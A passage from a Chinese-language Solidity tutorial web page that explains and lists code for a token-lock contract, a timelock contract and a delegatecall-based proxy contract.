title="代币锁合约"></a>代币锁合约</h2><p>下面，我们就写一个锁仓<code>ERC20</code>代币的合约<code>TokenLocker</code>。它的逻辑很简单：</p><ul><li>开发者在部署合约时规定锁仓的时间，受益人地址，以及代币合约。</li><li>开发者将代币转入<code>TokenLocker</code>合约。</li><li>在锁仓期满，受益人可以取走合约里的代币</li></ul><h3 id="事件-1"><a href="#事件-1" class="headerlink" title="事件"></a>事件</h3><p><code>TokenLocker</code>合约中共有<code>2</code>个事件。</p><ul><li><code>TokenLockStart</code>：锁仓开始事件，在合约部署时释放，记录受益人地址，代币地址，锁仓起始时间，和结束时间。</li><li><code>Release</code>：代币释放事件，在受益人取出代币时释放，记录记录受益人地址，代币地址，释放代币时间，和代币数量。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 事件<br>event TokenLockStart(address indexed beneficiary, address indexed token, uint256 startTime, uint256 lockTime);<br>event Release(address indexed beneficiary, address indexed token, uint256 releaseTime, uint256 amount);<br></code></pre></td></tr></table></figure><h3 id="状态变量-1"><a href="#状态变量-1" class="headerlink" title="状态变量"></a>状态变量</h3><p><code>TokenLocker</code>合约中共有<code>4</code>个状态变量。</p><ul><li><code>token</code>：锁仓代币地址。</li><li><code>beneficiary</code>：受益人地址。</li><li><code>locktime</code>：锁仓时间(秒)。</li><li><code>startTime</code>：锁仓起始时间戳(秒)。</li></ul><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-comment">// 被锁仓的ERC20代币合约</span><br>IERC20 <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> token;<br><span class="hljs-comment">// 受益人地址</span><br>address <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> beneficiary;<br><span class="hljs-comment">// 锁仓时间(秒)</span><br>uint256 <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> lockTime;<br><span class="hljs-comment">// 锁仓起始时间戳(秒)</span><br>uint256 <span class="hljs-keyword">public</span> <span class="hljs-keyword">immutable</span> startTime;<br></code></pre></td></tr></table></figure><h3 id="函数-1"><a href="#函数-1" class="headerlink" title="函数"></a>函数</h3><p><code>TokenLocker</code>合约中共有<code>2</code>个函数。</p><ul><li>构造函数：初始化代币合约，受益人地址，以及锁仓时间。</li><li><code>release()</code>：在锁仓期满后，将代币释放给受益人。需要受益人主动调用<code>release()</code>函数提取代币。</li></ul><h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.21;<br><br>import &#123;IERC20&#125; from &quot;./31_IERC20.sol&quot;;<br><br>contract TokenLocker &#123;<br>    // 事件<br>    //- `TokenLockStart`：锁仓开始事件，在合约部署时释放，记录受益人地址，代币地址，锁仓起始时间，和结束时间。<br>    event TokenLockStart(address indexed beneficiary,address indexed token,uint256 startTime,uint256 lockTime);<br>    //- `Release`：代币释放事件，在受益人取出代币时释放，记录记录受益人地址，代币地址，释放代币时间，和代币数量。<br>    event Release(address indexed beneficiary,address indexed token,uint256 releaseTime,uint256 amount);<br><br>    // 状态变量<br>    //- `token`：锁仓代币地址。<br>    IERC20 public immutable token;<br>    //- `beneficiary`：受益人地址。<br>    address  public immutable beneficiary;<br><br>    //- `locktime`：锁仓时间(秒)。<br>    uint256 public immutable lockTime;<br><br>    //- `startTime`：锁仓起始时间戳(秒)。<br>    uint256 public immutable startTime;<br><br>    // 函数<br>    //`TokenLocker`合约中共有`2`个函数。<br>    //<br>    //- 构造函数：初始化代币合约，受益人地址，以及锁仓时间。<br>    constructor(<br>        IERC20 token_,<br>        address beneficiary_,<br>        uint256   lockTime_<br>    )&#123;<br>        require(lockTime_ &gt; 0, &quot;TokenLock: lock time should greater than 0&quot;);<br>        token = token_;<br>        beneficiary = beneficiary_;<br>        lockTime = lockTime_;<br>        startTime = block.timestamp;<br>        // 释放事件<br>        emit TokenLockStart(beneficiary_,address(token_),block.timestamp,lockTime_);<br>    &#125;<br>    //- `release()`：在锁仓期满后，将代币释放给受益人。需要受益人主动调用`release()`函数提取代币<br>    /**<br>     * @dev 在锁仓时间过后，将代币释放给受益人。<br>     */<br>    function release() public &#123;<br>        require(block.timestamp &gt;= startTime+lockTime, &quot;TokenLock: current time is before release time&quot;);<br><br>        uint256 amount = token.balanceOf(address(this));<br>        require(amount &gt; 0, &quot;TokenLock: no tokens to release&quot;);<br><br>        token.transfer(beneficiary, amount);<br><br>        emit Release(msg.sender, address(token), block.timestamp, amount);<br><br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="45-时间锁"><a href="#45-时间锁" class="headerlink" title="45. 时间锁"></a>45. 时间锁</h1><p>时间锁（Timelock）是银行金库和其他高安全性容器中常见的锁定机制。它是一种计时器，旨在防止保险箱或保险库在预设时间之前被打开，即便开锁的人知道正确密码。</p><p>在区块链，时间锁被<code>DeFi</code>和<code>DAO</code>大量采用。它是一段代码，他可以将智能合约的某些功能锁定一段时间。它可以大大改善智能合约的安全性，举个例子，假如一个黑客黑了<code>Uniswap</code>的多签，准备提走金库的钱，但金库合约加了2天锁定期的时间锁，那么黑客从创建提钱的交易，到实际把钱提走，需要2天的等待期。在这一段时间，项目方可以找应对办法，投资者可以提前抛售代币减少损失</p><h2 id="时间锁合约"><a href="#时间锁合约" class="headerlink" title="时间锁合约"></a>时间锁合约</h2><p>下面，我们介绍一下时间锁<code>Timelock</code>合约。它的逻辑并不复杂：</p><ul><li>在创建<code>Timelock</code>合约时，项目方可以设定锁定期，并把合约的管理员设为自己。</li><li>时间锁主要有三个功能：<ul><li>创建交易，并加入到时间锁队列。</li><li>在交易的锁定期满后，执行交易。</li><li>后悔了，取消时间锁队列中的某些交易。</li></ul></li><li>项目方一般会把时间锁合约设为重要合约的管理员，例如金库合约，再通过时间锁操作他们。</li><li>时间锁合约的管理员一般为项目的多签钱包，保证去中心化。</li></ul><h3 id="事件-2"><a href="#事件-2" class="headerlink" title="事件"></a>事件</h3><p><code>Timelock</code>合约中共有<code>4</code>个事件。</p><ul><li><code>QueueTransaction</code>：交易创建并进入时间锁队列的事件。</li><li><code>ExecuteTransaction</code>：锁定期满后交易执行的事件。</li><li><code>CancelTransaction</code>：交易取消事件。</li><li><code>NewAdmin</code>：修改管理员地址的事件。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 事件<br>// 交易取消事件<br>event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint executeTime);<br>// 交易执行事件<br>event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint executeTime);<br>// 交易创建并进入队列 事件<br>event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime);<br>// 修改管理员地址的事件<br>event NewAdmin(address indexed newAdmin);<br></code></pre></td></tr></table></figure><h3 id="状态变量-2"><a href="#状态变量-2" class="headerlink" title="状态变量"></a>状态变量</h3><p><code>Timelock</code>合约中共有<code>4</code>个状态变量。</p><ul><li><code>admin</code>：管理员地址。</li><li><code>delay</code>：锁定期。</li><li><code>GRACE_PERIOD</code>：交易过期时间。如果交易到了执行的时间点，但在<code>GRACE_PERIOD</code>没有被执行，就会过期。</li><li><code>queuedTransactions</code>：进入时间锁队列交易的标识符<code>txHash</code>到<code>bool</code>的映射，记录所有在时间锁队列中的交易。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// 状态变量<br>address public admin; // 管理员地址<br>uint public constant GRACE_PERIOD = 7 days; // 交易有效期，过期的交易作废<br>uint public delay; // 交易锁定时间 （秒）<br>mapping (bytes32 =&gt; bool) public queuedTransactions; // txHash到bool，记录所有在时间锁队列中的交易<br></code></pre></td></tr></table></figure><h3 id="修饰器"><a href="#修饰器" class="headerlink" title="修饰器"></a>修饰器</h3><p><code>Timelock</code>合约中共有<code>2</code>个<code>modifier</code>。</p><ul><li><code>onlyOwner()</code>：被修饰的函数只能被管理员执行。</li><li><code>onlyTimelock()</code>：被修饰的函数只能被时间锁合约执行。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// onlyOwner modifier<br>modifier onlyOwner() &#123;<br>    require(msg.sender == admin, &quot;Timelock: Caller not admin&quot;);<br>    _;<br>&#125;<br><br>// onlyTimelock modifier<br>modifier onlyTimelock() &#123;<br>    require(msg.sender == address(this), &quot;Timelock: Caller not Timelock&quot;);<br>    _;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="函数-2"><a href="#函数-2" class="headerlink" title="函数"></a>函数</h3><p><code>Timelock</code>合约中共有<code>7</code>个函数。</p><ul><li><p>构造函数：初始化交易锁定时间（秒）和管理员地址。</p></li><li><p><code>queueTransaction()</code>：创建交易并添加到时间锁队列中。参数比较复杂，因为要描述一个完整的交易：</p><ul><li><code>target</code>：目标合约地址</li><li><code>value</code>：发送ETH数额</li><li><code>signature</code>：调用的函数签名（function signature）</li><li><code>data</code>：交易的call data</li><li><code>executeTime</code>：交易执行的区块链时间戳。</li></ul><p>调用这个函数时，要保证交易预计执行时间<code>executeTime</code>大于当前区块链时间戳+锁定时间<code>delay</code>。交易的唯一标识符为所有参数的哈希值，利用<code>getTxHash()</code>函数计算。进入队列的交易会更新在<code>queuedTransactions</code>变量中，并释放<code>QueueTransaction</code>事件。</p></li><li><p><code>executeTransaction()</code>：执行交易。它的参数与<code>queueTransaction()</code>相同。要求被执行的交易在时间锁队列中，达到交易的执行时间，且没有过期。执行交易时用到了<code>solidity</code>的低级成员函数<code>call</code>，在<a href="https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md">第22讲</a>中有介绍。</p></li><li><p><code>cancelTransaction()</code>：取消交易。它的参数与<code>queueTransaction()</code>相同。它要求被取消的交易在队列中，会更新<code>queuedTransactions</code>并释放<code>CancelTransaction</code>事件。</p></li><li><p><code>changeAdmin()</code>：修改管理员地址，只能被<code>Timelock</code>合约调用。</p></li><li><p><code>getBlockTimestamp()</code>：获取当前区块链时间戳。</p></li><li><p><code>getTxHash()</code>：返回交易的标识符，为很多交易参数的<code>hash</code>。</p></li></ul><h1 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><code class="hljs solidity">// SPDX-License-Identifier: UNLICENSED<br>pragma solidity ^0.8.21;<br><br>contract TimeLock &#123;<br>    // 事件<br>    //- `QueueTransaction`：交易创建并进入时间锁队列的事件。<br>    //- `ExecuteTransaction`：锁定期满后交易执行的事件。<br>    //- `CancelTransaction`：交易取消事件。<br>    //- `NewAdmin`：修改管理员地址的事件。<br>    // 事件<br>    // 交易取消事件<br>    event CancelTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint executeTime);<br>    // 交易执行事件<br>    event ExecuteTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature,  bytes data, uint executeTime);<br>    // 交易创建并进入队列 事件<br>    event QueueTransaction(bytes32 indexed txHash, address indexed target, uint value, string signature, bytes data, uint executeTime);<br>    // 修改管理员地址的事件<br>    event NewAdmin(address indexed newAdmin);<br>    // 状态变量<br>    //- `admin`：管理员地址。<br>    //- `delay`：锁定期。<br>    //- `GRACE_PERIOD`：交易过期时间。如果交易到了执行的时间点，但在`GRACE_PERIOD`没有被执行，就会过期。<br>    //- `queuedTransactions`：进入时间锁队列交易的标识符`txHash`到`bool`的映射，记录所有在时间锁队列中的交易。<br>    // 状态变量<br>    address public admin; // 管理员地址<br>    uint public constant GRACE_PERIOD = 7 days; // 交易有效期，过期的交易作废<br>    uint public delay; // 交易锁定时间 （秒）<br>    mapping (bytes32 =&gt; bool) public queuedTransactions; // txHash到bool，记录所有在时间锁队列中的交易<br>    // 修饰器<br>    //    - `onlyOwner()`：被修饰的函数只能被管理员执行。<br>    //    - `onlyTimelock()`：被修饰的函数只能被时间锁合约执行。<br>    // onlyOwner modifier<br>    modifier onlyOwner() &#123;<br>        require(msg.sender == admin, &quot;Timelock: Caller not admin&quot;);<br>        _;<br>    &#125;<br><br>    // onlyTimelock modifier<br>    modifier onlyTimelock() &#123;<br>        require(msg.sender == address(this), &quot;Timelock: Caller not Timelock&quot;);<br>        _;<br>    &#125;<br>    // 函数<br>    /**<br> * @dev 构造函数，初始化交易锁定时间 （秒）和管理员地址<br>     */<br>    constructor(uint delay_) &#123;<br>        delay = delay_;<br>        admin = msg.sender;<br>    &#125;<br><br>    /**<br>     * @dev 改变管理员地址，调用者必须是Timelock合约。<br>     */<br>    function changeAdmin(address newAdmin) public onlyTimelock &#123;<br>        admin = newAdmin;<br><br>        emit NewAdmin(newAdmin);<br>    &#125;<br><br>    /**<br>     * @dev 创建交易并添加到时间锁队列中。<br>     * @param target: 目标合约地址<br>     * @param value: 发送eth数额<br>     * @param signature: 要调用的函数签名（function signature）<br>     * @param data: call data，里面是一些参数<br>     * @param executeTime: 交易执行的区块链时间戳<br>     *<br>     * 要求：executeTime 大于 当前区块链时间戳+delay<br>     */<br>    function queueTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner returns (bytes32) &#123;<br>        // 检查：交易执行时间满足锁定时间<br>        require(executeTime &gt;= getBlockTimestamp() + delay, &quot;Timelock::queueTransaction: Estimated execution block must satisfy delay.&quot;);<br>        // 计算交易的唯一识别符：一堆东西的hash<br>        bytes32 txHash = getTxHash(target, value, signature, data, executeTime);<br>        // 将交易添加到队列<br>        queuedTransactions[txHash] = true;<br><br>        emit QueueTransaction(txHash, target, value, signature, data, executeTime);<br>        return txHash;<br>    &#125;<br><br>    /**<br>     * @dev 取消特定交易。<br>     *<br>     * 要求：交易在时间锁队列中<br>     */<br>    function cancelTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public onlyOwner&#123;<br>        // 计算交易的唯一识别符：一堆东西的hash<br>        bytes32 txHash = getTxHash(target, value, signature, data, executeTime);<br>        // 检查：交易在时间锁队列中<br>        require(queuedTransactions[txHash], &quot;Timelock::cancelTransaction: Transaction hasn&#x27;t been queued.&quot;);<br>        // 将交易移出队列<br>        queuedTransactions[txHash] = false;<br><br>        emit CancelTransaction(txHash, target, value, signature, data, executeTime);<br>    &#125;<br><br>    /**<br>     * @dev 执行特定交易。<br>     *<br>     * 要求：<br>     * 1. 交易在时间锁队列中<br>     * 2. 达到交易的执行时间<br>     * 3. 交易没过期<br>     */<br>    function executeTransaction(address target, uint256 value, string memory signature, bytes memory data, uint256 executeTime) public payable onlyOwner returns (bytes memory) &#123;<br>        bytes32 txHash = getTxHash(target, value, signature, data, executeTime);<br>        // 检查：交易是否在时间锁队列中<br>        require(queuedTransactions[txHash], &quot;Timelock::executeTransaction: Transaction hasn&#x27;t been queued.&quot;);<br>        // 检查：达到交易的执行时间<br>        require(getBlockTimestamp() &gt;= executeTime, &quot;Timelock::executeTransaction: Transaction hasn&#x27;t surpassed time lock.&quot;);<br>        // 检查：交易没过期<br>        require(getBlockTimestamp() &lt;= executeTime + GRACE_PERIOD, &quot;Timelock::executeTransaction: Transaction is stale.&quot;);<br>        // 将交易移出队列<br>        queuedTransactions[txHash] = false;<br><br>        // 获取call data<br>        bytes memory callData;<br>        if (bytes(signature).length == 0) &#123;<br>            callData = data;<br>        &#125; else &#123;<br>            callData = abi.encodePacked(bytes4(keccak256(bytes(signature))), data);<br>        &#125;<br>        // 利用call执行交易<br>        (bool success, bytes memory returnData) = target.call&#123;value: value&#125;(callData);<br>        require(success, &quot;Timelock::executeTransaction: Transaction execution reverted.&quot;);<br><br>        emit ExecuteTransaction(txHash, target, value, signature, data, executeTime);<br><br>        return returnData;<br>    &#125;<br><br>    /**<br>     * @dev 获取当前区块链时间戳<br>     */<br>    function getBlockTimestamp() public view returns (uint) &#123;<br>        return block.timestamp;<br>    &#125;<br><br>    /**<br>     * @dev 将一堆东西拼成交易的标识符<br>     */<br>    function getTxHash(<br>        address target,<br>        uint value,<br>        string memory signature,<br>        bytes memory data,<br>        uint executeTime<br>    ) public pure returns (bytes32) &#123;<br>        return keccak256(abi.encode(target, value, signature, data, executeTime));<br>    &#125;<br><br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="46-代理合约"><a href="#46-代理合约" class="headerlink" title="46. 代理合约"></a>46. 代理合约</h1><h2 id="代理模式"><a href="#代理模式" class="headerlink" title="代理模式"></a>代理模式</h2><p><code>Solidity</code>合约部署在链上之后，代码是不可变的（immutable）。这样既有优点，也有缺点：</p><ul><li>优点：安全，用户知道会发生什么（大部分时候）。</li><li>坏处：就算合约中存在bug，也不能修改或升级，只能部署新合约。但是新合约的地址与旧的不一样，且合约的数据也需要花费大量gas进行迁移。</li></ul><p>有没有办法在合约部署后进行修改或升级呢？答案是有的，那就是<strong>代理模式</strong>。</p><p><img src="/img/web3/46-1.png" alt="46-1"></p><p>代理模式将合约数据和逻辑分开，分别保存在不同合约中。我们拿上图中简单的代理合约为例，数据（状态变量）存储在代理合约中，而逻辑（函数）保存在另一个逻辑合约中。代理合约（Proxy）通过<code>delegatecall</code>，将函数调用全权委托给逻辑合约（Implementation）执行，再把最终的结果返回给调用者（Caller）。</p><p>代理模式主要有两个好处：</p><ol><li>可升级：当我们需要升级合约的逻辑时，只需要将代理合约指向新的逻辑合约。</li><li>省gas：如果多个合约复用一套逻辑，我们只需部署一个逻辑合约，然后再部署多个只保存数据的代理合约，指向逻辑合约。</li></ol><h2 id="代理合约"><a href="#代理合约" class="headerlink" title="代理合约"></a>代理合约</h2><p>下面我们介绍一个简单的代理合约，它由OpenZeppelin的<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/Proxy.sol">Proxy合约</a>简化而来。它有三个部分：代理合约<code>Proxy</code>，逻辑合约<code>Logic</code>，和一个调用示例<code>Caller</code>。它的逻辑并不复杂：</p><ul><li>首先部署逻辑合约<code>Logic</code>。</li><li>创建代理合约<code>Proxy</code>，状态变量<code>implementation</code>记录<code>Logic</code>合约地址。</li><li><code>Proxy</code>合约利用回调函数<code>fallback</code>，将所有调用委托给<code>Logic</code>合约</li><li>最后部署调用示例<code>Caller</code>合约，调用<code>Proxy</code>合约。</li><li><strong>注意</strong>：<code>Logic</code>合约和<code>Proxy</code>合约的状态变量存储结构相同，不然<code>delegatecall</code>会产生意想不到的行为，有安全隐患。</li></ul><h3 id="代理合约Proxy"><a href="#代理合约Proxy" class="headerlink" title="代理合约Proxy"></a>代理合约<code>Proxy</code></h3><p><code>Proxy</code>合约不长，但是用到了内联汇编，因此比较难理解。它只有一个状态变量，一个构造函数，和一个回调函数。状态变量<code>implementation</code>，在构造函数中初始化，用于保存<code>Logic</code>合约地址。</p><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs typescript">contract <span class="hljs-title class_">Proxy</span> &#123;<br>    address <span class="hljs-keyword">public</span> implementation; <span class="hljs-comment">// 逻辑合约地址。implementation合约同一个位置的状态变量类型必须和Proxy合约的相同，不然会报错。</span><br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">@dev</span> 初始化逻辑合约地址</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-title function_">constructor</span>(<span class="hljs-params">address implementation_</span>)&#123;<br>        implementation = implementation_;<br>    &#125;<br></code></pre></td></tr></table></figure><p><code>Proxy</code>的回调函数将外部对本合约的调用委托给 <code>Logic</code> 合约。这个回调函数很别致，它利用内联汇编（inline assembly），让本来不能有返回值的回调函数有了返回值。其中用到的内联汇编操作码：</p><ul><li><code>calldatacopy(t, f, s)</code>：将calldata（输入数据）从位置<code>f</code>开始复制<code>s</code>字节到mem（内存）的位置<code>t</code>。</li><li><code>delegatecall(g, a, in, insize, out, outsize)</code>：调用地址<code>a</code>的合约，输入为<code>mem[in..(in+insize))</code> ，输出为<code>mem[out..(out+outsize))</code>， 提供<code>g</code>wei的以太坊gas。这个操作码在错误时返回<code>0</code>，在成功时返回<code>1</code>。</li><li><code>returndatacopy(t, f, s)</code>：将returndata（输出数据）从位置<code>f</code>开始复制<code>s</code>字节到mem（内存）的位置<code>t</code>。</li><li><code>switch</code>：基础版<code>if/else</code>，不同的情况<code>case</code>返回不同值。可以有一个默认的<code>default</code>情况。</li><li><code>return(p, s)</code>：终止函数执行, 返回数据<code>mem[p..(p+s))</code>。</li><li><code>revert(p, s)</code>：终止函数执行, 回滚状态，返回数据<code>mem[p..(p+s))</code>。</li></ul><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs ceylon"><span class="hljs-comment">/**</span><br><span class="hljs-comment">* @dev 回调函数，将本合约的调用委托给 `implementation` 合约</span><br><span class="hljs-comment">* 通过assembly，让回调函数也能有返回值</span><br><span class="hljs-comment">*/</span><br>fallback() external payable &#123;<br>    address <span class="hljs-number">_</span>implementation = implementation;<br>    <span class="hljs-keyword">assembly</span> &#123;<br>        <span class="hljs-comment">// 将msg.data拷贝到内存里</span><br>        <span class="hljs-comment">// calldatacopy操作码的参数: 内存起始位置，calldata起始位置，calldata长度</span><br>        calldatacopy(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, calldatasize())<br><br>        <span class="hljs-comment">// 利用delegatecall调用implementation合约</span><br>        <span class="hljs-comment">// delegatecall操作码的参数：gas, 目标合约地址，input mem起始位置，input mem长度，output area mem起始位置，output area mem长度</span><br>        <span class="hljs-comment">// output area起始位置和长度位置，所以设为0</span><br>        <span class="hljs-comment">// delegatecall成功返回1，失败返回0</span><br>        <span class="hljs-keyword">let</span> result := delegatecall(gas(), <span class="hljs-number">_</span>implementation, <span class="hljs-number">0</span>, calldatasize(), <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br><br>        <span class="hljs-comment">// 将return data拷贝到内存</span><br>        <span class="hljs-comment">// returndata操作码的参数：内存起始位置，returndata起始位置，returndata长度</span><br>        returndatacopy(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, returndatasize())<br><br>        <span class="hljs-keyword">switch</span> result<br>        <span class="hljs-comment">// 如果delegate call失败，revert</span><br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span> &#123;<br>            revert(<span class="hljs-number">0</span>, returndatasize())<br>        &#125;<br>        <span class="hljs-comment">// 如果delegate call成功，返回mem起始位置为0，长度为returndatasize()的数据（格式为bytes）</span><br>        <span class="hljs-keyword">default</span> &#123;<br>            <span class="hljs-keyword">return</span>(<span class="hljs-number">0</span>, returndatasize())<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="逻辑合约Logic"><a href="#逻辑合约Logic" class="headerlink" 